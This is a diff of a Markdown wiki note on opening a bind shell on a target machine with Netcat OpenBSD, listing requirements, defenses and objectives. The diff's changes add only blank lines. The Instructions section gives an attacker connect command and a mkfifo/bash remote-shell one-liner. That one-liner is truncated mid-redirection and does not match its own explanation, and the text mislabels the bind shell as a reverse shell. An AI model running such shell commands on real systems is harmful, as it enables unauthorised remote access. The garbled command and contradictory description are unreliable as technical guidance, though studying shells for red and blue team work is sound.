@@ -33,11 +33,15 @@ When an attacker successfully creates a bind shell on a target machine, they can
 
 This technique can be valuable for both offensive and defensive purposes. It can be used by red teams to test the security of a network, and by blue teams to identify and remediate vulnerabilities.
 
+ 
+
 ## Requirements
 
 1. Access to the target machine
 
 1. Netcat OpenBSD installed on the target machine
+
+ 
 
 ## Defense
 
@@ -47,6 +51,8 @@ This technique can be valuable for both offensive and defensive purposes. It can
 
 1. Regularly monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Create a bind shell on a target machine using Netcat OpenBSD
@@ -55,11 +61,19 @@ This technique can be valuable for both offensive and defensive purposes. It can
 
 1. Execute commands on the target machine
 
+ 
+
 # Instructions
 
 1. To establish a reverse shell connection, run the following command on the attacker machine: nc -nv <target-ip> 51337. Once the connection is established, you will have a shell on the target machine.
 
+ 
+
+
+
 **Code**: [[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>]]
+
+
 
 > This command creates a named pipe (FIFO) in the /tmp directory and listens for incoming connections on port 51337. When a connection is established, it executes a bash shell and redirects the input and output to the named pipe. The attacker can then connect to the target machine using netcat and gain a remote shell access.
 
@@ -79,3 +93,5 @@ This technique can be valuable for both offensive and defensive purposes. It can
 
 - [[Bind Shell]]
 - [[Netcat OpenBsd]]
+
+
